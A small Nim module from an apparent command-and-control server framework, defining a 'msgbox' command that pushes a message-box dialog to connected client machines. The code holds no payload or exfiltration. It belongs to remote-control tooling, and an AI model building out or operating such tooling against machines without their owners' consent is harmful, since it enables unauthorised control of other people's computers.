import std/[
  asyncdispatch, 
  tables, 
  json
]

import ../../types, ../../logging, ../../communication

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 2:
    errorLog "you must specify a title and caption for the message box, see 'help msgbox'"
    return
  
  for client in server.cli.handlingClient:
    discard await client.sendClientTask("msgbox", %*[ args[0], args[1] ])

let cmd*: Command = Command(
  execProc: execProc,
  name: "msgbox",
  argsLength: 2,
  usage: @["msgbox \"[title]\" \"[caption]\""],
  cliMode: @[ClientInteractMode],
  description: "Send a message box",
  category: CCClientInteraction,
  requiresConnectedClient: true
)